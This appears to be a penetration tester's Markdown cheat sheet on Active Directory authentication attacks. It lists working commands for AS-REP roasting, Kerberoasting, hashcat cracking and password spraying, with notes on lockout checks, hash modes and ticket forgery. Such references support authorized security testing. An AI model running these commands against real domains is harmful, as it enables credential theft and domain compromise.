# AD authentication checks

Check lockout policy and the current failure count before any password test. Use the [resultant / fine-grained policy checks](powerview.md#password-and-lockout-policy), not only the domain default.

```bash
nxc smb <DC-IP> -u <USER> -p '<PW>' --pass-pol
```
- Failure counters differ per DC: a zero count is not a spraying allowance. Note DC, threshold, observation window, earlier attempts.

## AS-REP roasting
Users without Kerberos pre-auth:
```bash
impacket-GetNPUsers <DOMAIN.TLD>/ -dc-ip <DC-IP> -usersfile users.txt -no-pass -format hashcat
nxc ldap <DC-IP> -u <USER> -p '<PW>' --asreproast hashes.asreproast
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
```
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```
- `18200` = etype 23. Check the emitted format before choosing a mode (`$krb5asrep$23$`).

## Kerberoasting
User-backed SPNs only; machine / managed-service passwords are poor crack targets.
```bash
impacket-GetUserSPNs -request -dc-ip <DC-IP> <DOMAIN.TLD>/<USER>
nxc ldap <DC-IP> -u <USER> -p '<PW>' --kerberoasting hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```
```powershell
.\Rubeus.exe kerberoast /outfile:kerb.txt
```
- `13100` = etype 23 TGS. AES TGS (17/18) → `19600` / `19700`.
- Newer DC updates default service tickets away from RC4: expect AES hashes on some accounts.
- Rubeus: scope with `/user:` or `/spn:` (check installed help).

## Password spray (after lockout check)
```bash
nxc smb <DC-IP> -u users.txt -p '<PW>' --continue-on-success
```

## Tickets / replication
- Silver ticket: service hash + domain SID + target SPN. Golden: `krbtgt` key → [tickets](tickets.md).
- DCSync needs replication rights → [credential-access](credential-access.md#dcsync-inspect-rights-and-select-the-account).
- NetNTLMv2 ≠ passable NT hash.
